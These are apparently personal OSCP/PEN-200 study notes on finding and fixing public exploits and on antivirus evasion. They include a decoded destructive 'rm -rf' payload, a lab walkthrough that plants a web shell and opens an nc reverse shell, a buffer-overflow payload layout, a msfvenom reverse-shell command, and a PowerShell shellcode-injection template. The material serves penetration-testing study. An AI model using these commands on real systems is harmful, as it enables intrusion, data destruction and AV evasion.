---
title: '[OSCP, PEN-200] Instructional notes - Part 2'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 2
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 1](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md) 內容

# Exploits
## Locating Public Exploits    
### - A Word of Caution 
Malicious SSH exploit asking for root privileges on the attacking machine
```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```
對 payload 檢查發現了一個 jmpcode 陣列
```c
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```
> 已被編碼的十六進位字元
```
┌──(chw㉿CHW-kali)-[~]
└─$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```
> Malicious SSH exploit payload that will wipe your attacking machine\
> The program would then connect to a public IRC server to announce the user's actions to the world
             
>[!Tip]
> Exploits that are written in a low-level programming language and require compilation are often hosted in both source code and binary format.

### - Online Exploit Resources
- [The Exploit Database](https://www.exploit-db.com/)\
It is a free archive of public exploits that are gathered through submissions, mailing lists, and public resources.
![image](https://hackmd.io/_uploads/ry-WBajrJl.png)
> `D field`: download exploit file\
> `A field`: vulnerable application files\
> `V field`: EDB Verified checkmark\
> `Type field`: dos, local, remote, or webapp.\
    
- [Packet Storm](https://packetstorm.news/)\
An information security website that provides up-to-date information on security news, exploits, and tools (published tools by security vendors) for educational and testing purposes.
![image](https://hackmd.io/_uploads/r11UD6jSJx.png)
    
- GitHub\
An online code hosting platform for version control and collaboration.
    - [Offsec Github](https://github.com/offensive-security)
    - [CHW Github](https://github.com/chw41) 😎
    
- Google Search Operators\
searching for exploits using a specific software's version followed by the "exploit" keyword
    ```
    ┌──(chw㉿CHW-kali)-[~]
    └─$ firefox --search "Microsoft Edge site:exploit-db.com"
    ```
### - Offline Exploit Resources            
#### - Exploit Frameworks
An exploit framework1 is a software package that contains reliable exploits for easy execution against a target.\
- [Metasploit](https://github.com/rapid7/metasploit-framework)\
[Offsec Msfconsole](https://www.offsec.com/metasploit-unleashed/msfconsole/)\
免費 community edition 與付費 pro version.\
![image](https://hackmd.io/_uploads/HyPCdynBJx.png)
- [Core Impact](https://www.coresecurity.com/products/core-impact)\
Core Impact 是商業工具，需付費。\
![image](https://hackmd.io/_uploads/ByqYj0iSJl.png)
- [Immunity Canvas](https://www.e-spincorp.com/immunity-canvas/)\
需購買授權，commercial security assessment tools (SAT) 
![image](https://hackmd.io/_uploads/BysOA0oBJx.png)
- [The Browser Exploitation Framework (BeEF)](https://beefproject.com/)\
針對瀏覽器漏洞的開源框架，用於針對用戶端進行攻擊\
![image](https://hackmd.io/_uploads/HySq_1nSJg.png)

- [nuclei](https://github.com/projectdiscovery/nuclei)
基於 YAML 語法範本的定製化快速漏洞掃描器\
![image](https://hackmd.io/_uploads/SywlrkxLJx.png)
        

#### - SearchSploit

The Exploit Database provides a downloadable archived copy of all the hosted exploit code. (default in Kali)
```
┌──(chw㉿CHW-kali)-[~]
└─$ sudo apt update && sudo apt install exploitdb
[sudo] password for kali: 
...
The following packages will be upgraded:
     exploitdb
...
Setting up exploitdb (20220526-0kali1) ...
...   
```
Exploit Database archive under `/usr/share/exploitdb/`
exploits and shellcodes
```
┌──(chw㉿CHW-kali)-[~]
└─$ ls -1 /usr/share/exploitdb/ 

┌──(chw㉿CHW-kali)-[~]
└─$ ls -1 /usr/share/exploitdb/exploits
aix
alpha
android
arm
ashx
asp
aspx
atheos
beos
bsd
bsd_x86
cfm
cgi
freebsd
freebsd_x86
...
```
> These sub-directories are separated based on operating system, architecture, scripting language, etc.

>[!Note]
> SearchSploit 是 Exploit Database的一部分，提供 local 漏洞資料庫搜尋工具。\
> `searchsploit <關鍵字>`\
> `searchsploit -m <Exploit ID>`\
> `searchsploit -u`: 更新 db
```
==========
Examples 
==========
searchsploit afd windows local
searchsploit -t oracle windows
searchsploit -p 39446
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
searchsploit -s Apache Struts 2.0.0
searchsploit linux reverse password
searchsploit -j 55555 | json_pp
    
For more examples, see the manual: https://www.exploit-db.com/searchsploit       
```
Search for all available remote exploits that target the SMB service on the Windows operating system
```
┌──(chw㉿CHW-kali)-[~]
└─$ searchsploit remote smb microsoft windows
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029) (Metasploit)                             | windows/remote/16366.rb
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)   | windows/remote/43970.rb
Microsoft Windows - 'SMBGhost' Remote Code Execution                                                                        | windows/remote/48537.py
Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)                                                       | windows/remote/40280.py
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050)                                | windows/remote/14674.txt
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050) (Metasploit)                   | windows/remote/16363.rb
Microsoft Windows - SMB Relay Code Execution (MS08-068) (Metasploit)                                                        | windows/remote/16360.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                               | windows/dos/41891.rb
Microsoft Windows - SmbRelay3 NTLM Replay (MS08-068)                                                                        | windows/remote/7125.txt
Microsoft Windows 2000/XP - SMB Authentication Remote Overflow                                                              | windows/remote/20.txt
Microsoft Windows 2003 SP2 - 'ERRATICGOPHER' SMB Remote Code Execution                                                      | windows/remote/41929.py
Microsoft Windows 2003 SP2 - 'RRAS' SMB Remote Code Execution                                                               | windows/remote/44616.py
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                            | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                        | windows/remote/42315.py     
```     
若要修改 exploit，參數 `-m`:
```
┌──(chw㉿CHW-kali)-[~]
└─$ searchsploit -m windows/remote/48537.py

  Exploit: Microsoft Windows - 'SMBGhost' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48537
     Path: /usr/share/exploitdb/exploits/windows/remote/48537.py
File Type: Python script, ASCII text executable, with very long lines (343)

Copied to: /home/kali/48537.py
    
┌──(chw㉿CHW-kali)-[~]
└─$ searchsploit -m 42031
    Exploit: Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42031
     Path: /usr/share/exploitdb/exploits/windows/remote/42031.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/42031.py
```
>[!Tip]
> What is the searchsploit command to search for the following terms: php, webdav, windows?
> `searchsploit php webdav windows`

![image](https://hackmd.io/_uploads/rJtokZhB1e.png)

#### - Nmap NSE Scripts
NSE comes with a variety of scripts to enumerate, brute force, fuzz, and detect.\
NSE can be found under `/usr/share/nmap/scripts`
```
┌──(chw㉿CHW-kali)-[~]
└─$ grep Exploits /usr/share/nmap/scripts/*.nse
/usr/share/nmap/scripts/clamav-exec.nse:Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.
/usr/share/nmap/scripts/http-awstatstotals-exec.nse:Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14
/usr/share/nmap/scripts/http-axis2-dir-traversal.nse:Exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by
/usr/share/nmap/scripts/http-fileupload-exploiter.nse:Exploits insecure file upload forms in web applications
/usr/share/nmap/scripts/http-litespeed-sourcecode-download.nse:Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x
/usr/share/nmap/scripts/http-majordomo2-dir-traversal.nse:Exploits a directory traversal vulnerability existing in Majordomo2 to retrieve remote files. (CVE-2011-0049).
/usr/share/nmap/scripts/http-phpmyadmin-dir-traversal.nse:Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and
/usr/share/nmap/scripts/http-tplink-dir-traversal.nse:Exploits a directory traversal vulnerability existing in several TP-Link
/usr/share/nmap/scripts/http-traceroute.nse:Exploits the Max-Forwards HTTP header to detect the presence of reverse proxies.
/usr/share/nmap/scripts/http-vuln-cve2006-3392.nse:Exploits a file disclosure vulnerability in Webmin (CVE-2006-3392)
/usr/share/nmap/scripts/http-vuln-cve2009-3960.nse:Exploits cve-2009-3960 also known as Adobe XML External Entity Injection.
/usr/share/nmap/scripts/http-vuln-cve2014-3704.nse:Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32
/usr/share/nmap/scripts/http-vuln-cve2014-8877.nse:Exploits a remote code injection vulnerability (CVE-2014-8877) in Wordpress CM
/usr/share/nmap/scripts/oracle-brute-stealth.nse:Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle's

```
Information of specific NSE: nmap with the `--script-help`
```
┌──(chw㉿CHW-kali)-[~]
└─$ nmap --script-help=clamav-exec.nse
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 19:56 CST

clamav-exec
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/clamav-exec.html
  Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.

  ClamAV server 0.99.2, and possibly other previous versions, allow the execution
  of dangerous service commands without authentication. Specifically, the command 'SCAN'
  may be used to list system files and the command 'SHUTDOWN' shut downs the
  service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).

  This script without arguments test the availability of the command 'SCAN'.

  Reference:
  * https://twitter.com/nitr0usmx/status/740673507684679680
  * https://bugzilla.clamav.net/show_bug.cgi?id=11585
```

### - Exploiting a Target
靶機：192.168.175.11\
![image](https://hackmd.io/_uploads/ry83y_pHyl.png)

1. Recon
```
CWei@CHW-MacBook-Pro ~ % nmap -sC -sV -T4 -Pn 192.168.175.11
Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-28 20:28 CST
Nmap scan report for 192.168.175.11
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ab:2c:88:2e:1c:fe:75:32:cc:96:f2:2f:87:82:5d:a4 (RSA)
|   256 63:47:54:a7:95:bf:8a:e0:5c:b2:8e:0d:94:2e:17:a9 (ECDSA)
|_  256 c4:96:25:ed:50:2a:8e:47:21:da:ed:15:b3:24:b3:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Artificial Intelligence Development Corporation
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.58 seconds
```
> 開了 22 和 80 port 

About Us page
![image](https://hackmd.io/_uploads/SycFed6rkl.png)
> staff information

2. directory enumeration
dirsearch tool\
![image](https://hackmd.io/_uploads/BkMaZdaBJe.png)

http://192.168.175.11/project/ \
![login](https://hackmd.io/_uploads/B1h_m_TByg.png)

![image](https://hackmd.io/_uploads/ryAI_CJUkl.png)
> 檢查 Application 版本\
> 利用 qdPM 9.1 版本找 exploits

3. Exploit DB
檢查最新的漏洞利用，確定與系統吻合\
`Review the exploit` and `gain a basic understanding` of it before executing it
![image](https://hackmd.io/_uploads/SJQSFCyLJx.png)
> exploit requires: `username` and `password` \
> 前提：\
> If we have working credentials with the web application, the exploit will upload a command web shell 

```
CWei@CHW-MacBook-Pro Desktop % python3 50944.py -url http://192.168.215.11/project/ -u george@AIDevCorp.org -p AIDevCorp
You are not able to use the designated admin account because they do not have a myAccount page.

The DateStamp is 2024-12-30 10:15
Backdoor uploaded at - > http://192.168.215.11/project/uploads/users/134808-backdoor.php?cmd=whoami
```
http://192.168.215.11/project/uploads/users/134808-backdoor.php?cmd=whoami

```html
<pre>www-data
</pre>
```
4. Attempt a netcat reverse shell
```
curl http://192.168.215.11/project/uploads/users/134808-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.222 6666 -e /bin/bash"
```  
```
CWei@CHW-MacBook-Pro Desktop % nc -nvlp 6666
Connection from 192.168.215.11:43062
id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```
    
## Fixing Exploits
Writing an exploit: difficult and time-consuming\
✅ modify a public exploit to suit our specific needs.
ˉ

### Fixing Memory Corruption Exploits
Memory corruption exploits (such as buffer overflows) 相對複雜且難以修改
>[!Important]
> **Buffer Overflow**:\
> 只要使用者提供的內容超出堆疊限制並溢位到相鄰的記憶體區域\
> ![image](https://hackmd.io/_uploads/Bk-oRTQUkl.png)
> Memory corruption vulnerabilities 可能發生在程式的不同部分，例如 heap 或stack。heap 是動態管理的，通常儲存全域可存取的大型資料，而 stack 則用來儲存函式的區域資料，且其大小通常是固定的。
> 1. 建立大緩衝區觸發溢位
    Create a large buffer to trigger the overflow.
> 2. 覆蓋返回位址並控制 EIP
    Take control of EIP by overwriting a return address on the stack, padding the large buffer with an appropriate offset.
> 3. 在緩衝區中包含有效負載，加入 NOP Sled
    Include a chosen payload in the buffer prepended by an optional NOP5 sled.
> 4. 選擇正確的返回位址
    Choose a correct return address instruction such as JMP ESP (or a different register) to redirect the execution flow to the payload.

Buffer of 64 characters has been declared and a user command line argument is copied into it via the strcpy2 function
```c
*buffer[64]*
...
strcpy(buffer, argv[1]);
```
以上範例不會檢查目標位址是否有足夠的空間來容納原始字串，可能會導致意外的應用程式行為。\
**若使用者的輸入大於目標緩衝區的空間，則可能會覆寫返回位址。(overflow)**
![image](https://hackmd.io/_uploads/r1DPzRX81l.png)
> - **Before StrCpy**:\
> Buffer 已初始化，並在記憶體中保留其空間。紅字顯示，返回位址保存了正確的記憶體位址
> - **Copy with 32 A's**:\
> user 輸入 32 characters 的 Ａ， 填滿了 Buffer 的一半。
> - **Copy with 80 A's**:\
> user 輸入 80 characters 的 Ａ， 填滿了整個 64 位元長的緩衝區，覆蓋了return address。

As the letter "A" in hexadecimal converts to "41", the return address would be overwritten with a value of `\x41\x41\x41\x41`\
Attacket 會使用 shellcode 的有效映射記憶體位址重寫回傳位址，使攻擊者能夠完全控制目標電腦

>[!Warning]
> A typical buffer overflow attack scenario involves `overwriting the return address with a JMP ESP instruction`, which instructs the program to jump to the stack and execute the shellcode that has been injected right after the beginning of the payload.

Bad characters are `ASCII` or `UNICODE` characters that break the application when included in the payload because they might be interpreted as control characters.\
Ex. null-byte "\x00" is often interpreted as a string terminator

以下針對 Sync Breeze Enterprise 10.0.28 並專注於兩個可用漏洞\
```
┌──(chw㉿CHW-kali)-[~]
└─$ searchsploit "Sync Breeze Enterprise 10.0.28"
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                       |  Path
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
Sync Breeze Enterprise 10.0.28 - Denial of-Service (PoC)                                                             | windows/dos/43200.py
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow                                                              | windows/remote/42928.py
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC)                                                        | windows/dos/42341.c
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
> 三個 exploit，為避免 simple application crash，若有更好的選擇先不使用 Dos exploit\

>[!Note]
>The vulnerability is present in the **HTTP server module** where a buffer overflow condition is triggered on a `POST request`.

```
offset    = "A" * 780 
JMP_ESP   =  "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit   = offset + JMP_ESP + shellcode
```
在偏移量 780 處，我們使用位於記憶體位址 `0x10090c83` 的JMP ESP (Jump to Extended Stack Pointer)指令覆寫指令指標

>[!Important]
>The first key difference is that scripting languages are executed through an interpreter and not compiled to create a stand-alone executable.\
>如果使用 python 腳本，會需要依賴目標環境是否有安裝 python 
>> 或考慮使用 PyInstaller ，將 Python 應用程式打包成適用於各種目標作業系統的獨立執行檔
>
> python 優點：串接字串非常容易 `string3 = string1 + string2`

以下使用 C exploit 舉例:
```
┌──(chw㉿CHW-kali)-[~]
└─$ searchsploit -m 42341
  Exploit: Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC)
...
Copied to: /home/chw/42341.c

┌──(chw㉿CHW-kali)-[~]
└─$ cat 42341.c 
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
...
```
> 根據 include winsock2.h 可以猜測應該需要在 Windows 上編譯

為了避免編譯問題，通常建議針對程式碼所針對的特定作業系統使用本機編譯器；但若只能存取單一環境，需要利用針對不同平台編碼的漏洞。在這種情況下，交叉編譯器會非常有幫助。


###  Cross-Compiling Exploit Code 交叉編譯漏洞
- mingw-w64交叉編譯器 ([document](https://www.mingw-w64.org/)): 專門用於在 Windows 平台上生成原生的 Windows 應用程式。

```
┌──(chw㉿CHW-kali)-[~]
└─$ sudo apt install mingw-w64

┌──(chw㉿CHW-kali)-[~]
└─$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0xa5): undefined reference to `_imp__WSAGetLastError@0'
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0xe9): undefined reference to `_imp__socket@12'
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0xfc): undefined reference to `_imp__WSAGetLastError@0'
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x126): undefined reference to `_imp__inet_addr@4'
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x146): undefined reference to `_imp__htons@4'
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x16f): undefined reference to `_imp__connect@12'
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x1b8): undefined reference to `_imp__send@16'
/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x1eb): undefined reference to `_imp__closesocket@4'
collect2: error: ld returned 1 exit status
```
編譯過程中出現了問題，透過簡單的 Google 搜尋與「[WSAStartup](https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-wsastartup)」相關的第一個錯誤就會發現這是在 winsock.h 中找到的函數:找不到 Winsock 庫時，會發生這些錯誤\
搜尋 `ws2_32 DLL` 並透過靜態連結將其包含在最終的可執行檔中
```
┌──(chw㉿CHW-kali)-[~]
└─$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```
> ws2_32 是 Windows Sockets 2（Winsock 2）的函式庫

### Fixing the Exploit
Inspecting the `42341.c` C code, we'll notice that it uses hard-coded values for the IP address and port fields:
```c
printf("[>] Socket created.\n");
server.sin_addr.s_addr = inet_addr("10.11.0.22");
server.sin_family = AF_INET;
server.sin_port = htons(80);
```

>[!Caution]
> SKIP

# Antivirus Evasion
>[!Note]
> Antivirus (AV):\
> 在預防、偵測和刪除惡意軟體的應用程式, 現在通常包含額外的保護功能，如IDS/IPS、防火牆、網站掃描器等。

防毒軟體的操作和決策是基於簽章(signatures)\
modern AV solutions, including Windows Defender, are shipped with a Machine Learning (ML) engine that is queried whenever an unknown file is discovered on a system.\
EDR 負責生成 security-event telemetry，並將這些資料轉發至安全資訊與事件管理（SIEM）系統

## AV Engines and Components
A modern antivirus is typically designed around the following components:
- File Engine 檔案引擎
both scheduled and real-time file scans. Parses the entire file system and sends each file's metadata or data to the signature engine
- Memory Engine 記憶體引擎
binary signatures or suspicious API calls that might result in memory injection attacks
- Network Engine 網路引擎
incoming and outgoing network traffic. Attempt to block the malware from communicating with its [Command and Control (C2) server](https://www.paloaltonetworks.com/cyberpedia/command-and-control-explained)
- Disassembler 反組譯器
translating machine code into assembly language
- Emulator/Sandbox 模擬器/沙盒
- Browser Plugin 瀏覽器外掛
get better visibility and detect malicious content 
- Machine Learning Engine 機器學習引擎

## Detection Methods
following AV detection methodologies and explain how they work
- Signature-based Detection
the filesystem is scanned for known malware signatures
- Heuristic-based Detection
relies on various rules and algorithms to determine whether or not an action is considered malicious
- Behavioral Detection
analyzes the behavior of a binary file.
- Machine Learning Detection
Microsoft Windows Defender has two ML components: 
    - client ML engine: which is responsible for `creating ML models` and `heuristics`.
    - cloud ML engine: which is capable of analyzing the `submitted sample against a metadata-based model` comprised of all the submitted samples.


### xxd
```
CWei@CHW-MacBook-Pro Desktop % cat malware.txt
chw
CWei@CHW-MacBook-Pro Desktop % xxd malware.txt
00000000: 6368 770a                                chw.
CWei@CHW-MacBook-Pro Desktop % xxd -b malware.txt
00000000: 01100011 01101000 01110111 00001010                    chw.
```
> `xxd`: 查看檔案的 hex 或 binary 內容的工具\
> `-b`: 以二進制形式\
> `01100011 01101000 01110111 00001010`\
01100011：對應 ASCII 字元 c\
01101000：對應 ASCII 字元 h\
01110111：對應 ASCII 字元 w\
00001010：對應 ASCII 字元 \n

### sha256sum / shasum
calculate the hash of the file
```
CWei@CHW-MacBook-Pro Desktop % shasum -a 256 malware.txt
903a570b9401c66909fe7addb6d4c495f9f08eeda124153098dc6d1d0baa4331  malware.txt

┌──(chw㉿CHW-kali)-[~]
└─$ sha256sum malware.txt
903a570b9401c66909fe7addb6d4c495f9f08eeda124153098dc6d1d0baa4331  malware.txt
```
若更改檔案中內容會導致 hash 值完全改變，這證明僅依賴 hash文件簽名檢測的脆弱性。(只看 Signature-based Detection 缺乏完整性)\
→ Heuristic-based Detection

以下範例使用使用一個簡單的 TCP reverse shell\
從掃描 popular Metasploit payload 開始。使用msfvenom，我們將產生一個包含有效負載的 Portable Executable (PE) file

>[!Important]
> PE file format 在 Windows 作業系統上用於執行檔和目標檔。 PE 格式表示一種 Windows 資料結構，詳細說明了Windows Loader 管理打包的可執行程式碼所需的資訊，包括所需的 dynamic libraries、API import and export tables 等。

```
┌──(chw㉿CHW-kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
[Virustotal](https://www.virustotal.com/gui/home/upload) results on the msfvenom payload
![image](https://hackmd.io/_uploads/BJa_4wY8kg.png)

## Bypassing Antivirus Detections

### 1. On-Disk Evasion
#### (1) packers 加殼
最早的規避方式。packers 產出的可執行檔不僅更小，在功能上與 new binary structure 一樣。產生的檔案具有新的雜湊簽名，因此可以有效繞過舊的和更簡單的 AV scanners。\
但只使用 UPX 沒辦法有效規避現在的 AV scanners
>[!Note]
> [UPX](https://github.com/upx/upx):\
> UPX 是一個快速、免費、開源的可執行檔案壓縮工具，用於減小可執行檔案的大小，同時保持可執行性。

#### (2) Obfuscators 混淆器
重新組織和改變程式碼，使 reverse-engineer 變得更加困難。
- replacing instructions 替換指令
- inserting irrelevant instructions 插入無關指令
- dead code
- splitting or reordering functions 函數分割或重新排序

現在的 Obfuscators 還有 runtime in-memory capabilities

#### (3) Crypter 加密
cryptographically alters executable code, adding a decryption stub that restores the original code upon execution.\
最有效的 AV evasion techniques


Highly effective antivirus evasion: `anti-reversing`, `anti-debugging`, `virtual machine emulation detection`, and so on.\
市面工具： [Enigma Protector](https://www.enigmaprotector.com/en/home.html)

### 2. In-Memory Evasion
In-Memory Injections,1 also known as PE Injection.\
**focuses on the `manipulation of volatile memory`**\
> Here is only cover in-memory injection using PowerShell.
#### (1) Remote Process Memory Injection
將 payload 注入另一個非惡意的 PE file, 最常見的方法是利用一組 `Windows API`。
1. 使用[OpenProcess function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) 取得有權存取的目標 HANDLE，可以查看有權訪問的 target process
2. 透過呼叫 Windows API 分配記憶體位址，使用 [VirtualAllocEx function](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
3. 在 remote process 分配完記憶體後，使用 [WriteProcessMemory function](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)將惡意的有效 payload 複製到新分配的記憶體區域
4. 成功複製到記憶體後，使用 [CreateRemoteThread function]([https:/](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)/) 來創建一個新的 process 執行這個 payload 

>[!Note]
>與 regular DLL injection 不同，DLLi 是通過使用 LoadLibrary API 從磁碟載入惡意的 DLL，Reflective DLLi 則是將由攻擊者儲存在 process memory 中的 DLL 載入並執行

#### (2) Process Hollowing
1. 在suspended state, launch 一個非惡意的 process 
2. 當成功啟動後，process 的 image 會移出記憶體空間，再來用 malicious executable image 取代
3.  當 process 恢復執行時，惡意程式就會成功執行

#### (3) Inline hooking
修改記憶體並將一個 hook (an instruction that redirects the code execution) 注入到某個函數， 讓系統指向我們的惡意程式\
☞ 在不顯眼的情況下注入並執行，可以繞過許多安全檢測機制。

#### rootkit
rootkit 常使用 Hooking 技巧，rootkit 是一種非常隱蔽的惡意程式，目的是透過改變系統的運作方式，讓駭客能持續、隱秘地控制目標電腦。它可以修改系統的不同層面，透過漏洞提權或利用已經有高權的程式來安裝。

這樣的技術讓 rootkit 可以在系統中運行，難以被發現。它可以用來監控系統、竊取資料或操控電腦的運作。

### AV Evasion Example

>[!Note]
> 1. 若將 malware 丟給 VirusTotal 分析，平台會將樣本發送給每個會員資格的防毒供應商。代表上傳不久，多數防毒軟體就會有 detection signatures。\
> `替代方案`：[AntiScan.Me](https://antiscan.me/)\
> This service scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties. 一天提供四次免費掃描
> 2. Windows Defender 的 Automatic Sample Submission (自動提交樣本) 會透過 ML cloud engines 分析樣本。


#### - Evading AV with Thread Injection
Finding a universal solution to bypass all antivirus products is difficult and time consuming, if not impossible.\
Example:\
`Avira Free Security` version 1.1.68.29553 on our `Windows 11` client.\
Security panel > Protection Options\
![image](https://hackmd.io/_uploads/B1a-XADDye.png)
> 顯示正在運行的保護措施

1. 測試 AV 是否 working
use the `Metasploit payload` we generated earlier and scan it with Avira.
![image](https://hackmd.io/_uploads/H13FQRDvyx.png)
> blocked
2. 借助 PowerShell 來 bypass antivirus products
3. remote process memory injection technique
case: x86 PowerShell interpreter.\
PowerShell 強大的功能是能夠與 Windows API 互動\
>[!Important]
> 即使腳本會被標記為惡意，它也可以被更改。防毒軟體通常會檢查 variable names, comments, and logic，但這些都可以更改。

4. 執行 in-memory injection 的基本模板化腳本
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
# C# 編譯並動態加入 PowerShell，Add-Type 會將定義的函數載入至 PowerShell 環境

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
# 創建一個執行緒，執行剛剛分配的記憶體地址（即 shellcode）。
```
> `VirtualAlloc`：`kernel32.dll` 匯入，分配一塊記憶體空間。\
`CreateThread`：`kernel32.dll` 匯入，創建一個執行緒。\
`memset`： `msvcrt.dll` 匯入，用於設置記憶體區塊的值。\
`$sc`： 字節陣列，用來存放 shellcode。\
`$size`：設定記憶體區塊大小，預設為 4KB (0x1000)，如果 shellcode 大小超過 4KB，則動態調整為 shellcode 長度。\
`VirtualAlloc`：分配一塊可執行（0x40）且可讀寫（0x3000）的記憶體。
`memset`：透過迴圈，將 shellcode 的每一個 byte 寫入目標記憶體。\

